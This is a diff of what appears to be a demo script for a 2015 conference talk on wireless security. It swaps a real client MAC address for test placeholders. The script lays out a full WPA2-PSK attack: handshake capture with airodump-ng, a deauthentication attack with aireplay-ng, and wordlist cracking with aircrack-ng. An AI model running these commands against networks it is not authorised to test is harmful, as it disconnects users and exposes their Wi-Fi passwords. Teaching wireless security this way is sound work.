@@ -5,8 +5,8 @@ ifconfig wlan0 up
 iwlist wlan0 scanning
 
 ## Listen for a handshake (Deauth as necessary)
-airodump-ng mon0 --bssid <INSERT NEW AP MAC> --channel 6 --write /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo
-aireplay-ng -0 1 -a <INSERT NEW AP MAC> -c EC:88:92:79:FB:0E mon0
+airodump-ng mon0 --bssid <Test AP> --channel 6 --write /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo
+aireplay-ng -0 1 -a <Test AP> -c <Test Client) mon0
 
 ## Crack the handshake
 aircrack-ng /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo -w /usr/share/wordlists/fasttrack.txt
